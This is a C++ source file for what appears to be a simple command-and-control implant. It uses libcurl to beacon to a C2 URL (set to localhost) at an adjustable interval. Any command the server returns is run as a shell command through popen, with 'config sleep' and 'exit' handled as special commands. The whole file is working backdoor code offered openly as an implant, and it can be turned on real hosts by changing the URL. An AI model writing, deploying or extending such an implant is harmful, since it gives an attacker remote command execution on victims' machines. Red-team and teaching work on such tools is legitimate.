#include <iostream>
#include <string>
#include <unistd.h>
#include <curl/curl.h>
#include <vector>
#include <array>
#include <memory>
#include <thread>
#include <chrono>

// Configuration
const std::string C2_URL = "http://localhost:8080/api/beacon";
const int SLEEP_TIME = 5;

// Callback to write received data into a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch(std::bad_alloc &e) {
        return 0;
    }
    return newLength;
}

// Function to execute shell command and return output
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        return "Failed to run command";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    CURL* curl;
    CURLcode res;
    
    std::cout << "[*] Implant Started. Beaconing to " << C2_URL << std::endl;

    int current_sleep = SLEEP_TIME;

    while (true) {
        curl = curl_easy_init();
        if (curl) {
            std::string readBuffer;

            curl_easy_setopt(curl, CURLOPT_URL, C2_URL.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ""); 
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

            res = curl_easy_perform(curl);

            if (res == CURLE_OK) {
                if (readBuffer != "sleep") {
                    std::cout << "[+] Received Command: " << readBuffer << std::endl;
                    
                    // Logic: Config vs Exec
                    if (readBuffer.rfind("config sleep ", 0) == 0) {
                        try {
                            int new_sleep = std::stoi(readBuffer.substr(13));
                            current_sleep = new_sleep;
                            std::cout << "[*] Sleep updated to " << current_sleep << "s" << std::endl;
                        } catch (...) {
                            std::cout << "[!] Invalid sleep value" << std::endl;
                        }
                    } 
                    else if (readBuffer == "exit") {
                        std::cout << "[*] Terminating Agent..." << std::endl;
                        return 0;
                    }
                    else {
                        // Standard Shell Exec
                        std::string output = exec(readBuffer.c_str());
                        std::cout << "    Output: " << output << std::endl;
                    }

                } else {
                    // std::cout << "." << std::flush;
                }
            } else {
                std::cerr << "[!] Curl Request Failed: " << curl_easy_strerror(res) << std::endl;
            }

            curl_easy_cleanup(curl);
        }

        // Dynamic Sleep
        std::this_thread::sleep_for(std::chrono::seconds(current_sleep));
    }

    return 0;
}
